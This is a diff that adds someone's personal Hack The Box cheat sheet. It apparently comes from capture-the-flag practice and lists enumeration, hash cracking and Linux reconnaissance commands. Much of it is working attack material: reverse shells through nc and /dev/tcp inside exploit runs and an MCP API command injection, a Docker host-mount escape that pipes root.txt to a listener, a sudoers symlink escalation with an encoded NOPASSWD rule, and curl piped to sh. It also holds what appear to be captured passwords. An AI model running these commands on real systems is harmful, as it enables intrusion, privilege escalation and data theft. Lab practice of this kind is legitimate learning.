@@ -1,0 +1,172 @@
+cc
+cd Downloads
+sudo openvpn starting_points_us-starting-point-2-dhcp.ovpn
+machines_us-5.ovpn
+
+improve shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+hash cracking 
+hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+    
+
+add ing into DNS 
+echo "10.129.48.245 wingdata.htb" | sudo tee -a /etc/hosts
+gobuster vhost -u http://three.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
+fuff
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u https://wingdata.htb/FUZZ -fr "File not found."
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://three.htb/ -fr "302 Found" -H "Host: FUZZ.three.htb"
+
+ss -tln
+
+-l: Display only listening sockets
+-t: Display TCP sockets
+-n: Do not try to resolve service name
+
+# Network interfaces and IPs
+ip a
+ifconfig
+
+# Routing table
+ip route
+netstat -rn
+
+# Open ports and listening services
+ss -tulnp
+netstat -tulnp
+
+# Active connections
+ss -antp
+netstat -antp
+
+# DNS config
+cat /etc/resolv.conf
+cat /etc/hosts
+
+# ARP table (other hosts on network)
+arp -a
+ip neigh
+# All running processes
+ps aux
+ps -ef
+
+# Process tree
+pstree -a
+
+# Processes with open network connections
+ss -tulnp
+netstat -tulnp
+
+# Real-time process monitor
+top
+htop
+
+
+# OS info
+uname -a
+cat /etc/os-release
+cat /etc/passwd
+
+# Logged in users
+who
+w
+last
+
+# Installed services
+systemctl list-units --type=service --state=running
+
+# Cron jobs
+crontab -l
+cat /etc/crontab
+ls /etc/cron*
+
+# SUID binaries (privesc)
+find / -perm -4000 2>/dev/null
+
+# Writable directories
+find / -writable -type d 2>/dev/null
+
+# Interesting files
+find / -name "*.conf" 2>/dev/null
+find / -name "*.txt" 2>/dev/null
+
+
+Quick All-in-one (LinPEAS)
+For HTB boxes, LinPEAS automates all of this:
+bashcurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+Or transfer it manually if no internet on the box:
+bash# On your Kali:
+python3 -m http.server 8080
+
+# On target:
+wget http://YOUR_IP:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+LinPEAS will highlight privesc vectors in red/yellow automatically.
+
+# On your Kali:
+
+
+# On target:
+wget http://10.10.15.169:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+
+
+Wing Data 
+10.129.46.126
+
+echo "10.129.46.126 wingdata.htb" | sudo tee -a /etc/hosts
+└─$ nmap -sV -sC 10.129.46.126                        
+
+ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40
+
+  
+Wing FTP Server v7.4.3
+1. CVE-2025-47812 (Critical RCE)
+
+python3 payload.py -u http://ftp.wingdata.htb -c "nc 10.10.15.169 5656 -e /bin/sh" -v
+facts 
+feroxbuster -u 'http://facts.htb/' -w /home/boltech/Desktop/FactsHTB/directory-list-2.3-medium.txt
+python CVE-2024-46987.py -u http://facts.htb --user aaa12 -p mimihaaog123 /etc/passwd | tail
+
+
+r04D!!_R4ge
+1slu0f876f11dn70tcs2stdsve
+
+
+11b676db3cc96fe6b99472137cb761d367c555b5
+
+git clone http://127.0.0.1:8080/<USERNAME>/<REPO>.git
+cd <REPO>
+ln -s /etc/sudoers.d/ben malicious_link
+git add malicious_link && git commit -m "Add symlink" && git push
+
+YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDpBTEw=
+
+
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+     -H "Content-Type: application/json" \
+     -d '{"serverConfig":{"command":"bash","args":["-c", "bash -i >& /dev/tcp/10.10.15.169/4444 0>&1"],"env":{}},"serverId":"pwned"}'
+
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+-H "Content-Type: application/json" \
+-d '{
+  "serverConfig": {
+    "command": "sg",
+    "args": [
+      "docker",
+      "-c",
+      "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc -w 10 10.10.15.169 4444"
+    ],
+    "env": {}
+  },
+  "serverId": "rootflag"
+}'
+
+
+nmap -p- --min-rate 5000 -sS 10.129.244.156
+echo "10.129.244.156 cctv.htb" | sudo tee -a /etc/hosts
+
